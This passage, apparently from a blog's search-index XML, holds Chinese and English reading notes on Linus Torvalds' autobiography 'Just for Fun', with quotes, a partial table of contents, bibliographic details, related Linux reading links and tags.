magazineMercury来自罗马神话中的信使和商旅之神墨丘利，代表为神人之间传达信息，同时意指淘金热时期在圣荷西邻近富有的水银矿脉(Mercury)，一语双关，故合并后保留原名。但在中文刊物中，偶有误译为《圣荷西水星报》。一般认为，《圣荷西信使报》是全世界第一家最早发展网路新闻产业的先驱。其时间可追溯至1992年，另一说是1987年。 Talk about Bill Gates he wasn’t the least bit interested in even meeting the guy.”There wouldn’t be much of a connection point,” he reasoned. “I’m completely uninterested in the thing that he’s the best in the world at. And he’s not interested in the thing that maybe I’m the best in the world at.I couldn’t give him advice in business and he couldn’t give me advice in technology.” Talk about Richard Stallmanthe God of Free Software.(p58) V. High School VI. University of Helsinki &amp; Finnish Army VII. Tell you some more about Finland (Sauna，Silence tradition and educational system) BIRTH OF AN OPERATINGKING OF THE BALL Intellectual Property 204 An End to Control 215 The Amusement Ride Ahead 220 Why Open Source Makes Sense 225 Fame and Fortune The Meaning of Life II 242 Index 251扩展阅读：Linux 操作系统 《Linus Torvalds:Just for Fun》 Linux 常用命令一百条 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单(Netflix版) Linux 性能诊断：荐书|《图解性能优化》 Linux 性能诊断：Web应用性能优化 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：Memory 推荐：电子书《Linux Perf Master》发表在GitBook平台，欢迎订阅、下载、批评指正: https://www.gitbook.com/book/riboseyim/linux-perf-master/details 参考文献 《Just for Fun》副题：The Story of an Accidental Revolutionary作者：Linus Torvalds 、 David Diamond售价：USA $14.99/CAN $18.50Paperback: 288 pagesPublisher: HarperBusiness; Reprint edition (June 4, 2002)Language: EnglishISBN-10: 0066620732ISBN-13: 978-0066620732出版年份：2001年阅读进度：201704～201705 Linus Torvalds was born in Finland and graduated from the University of Helsinki.He lives in San Jose, California. David Diamond has written for the New York Times,Wired,USA Weekend, and many other publications.He lives in Kentfield, California. 关于Torvalds及《Just For Fun》的批评意见I think that Linus Torvalds succeed first a foremost as an author of a “new BIOS”, a POSIX-compatible kernel implementation which became a de-facto standard“Linux is moving away from its founding ideals and not even Linus Torvalds can change it”. 阮一峰：《Linus Torvalds自传》摘录,20120903 维基百科：芬兰教育 About Linus Torvalds]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>OpenSource</tag>
        <tag>History</tag>
      </tags>
  </entry>
</search>
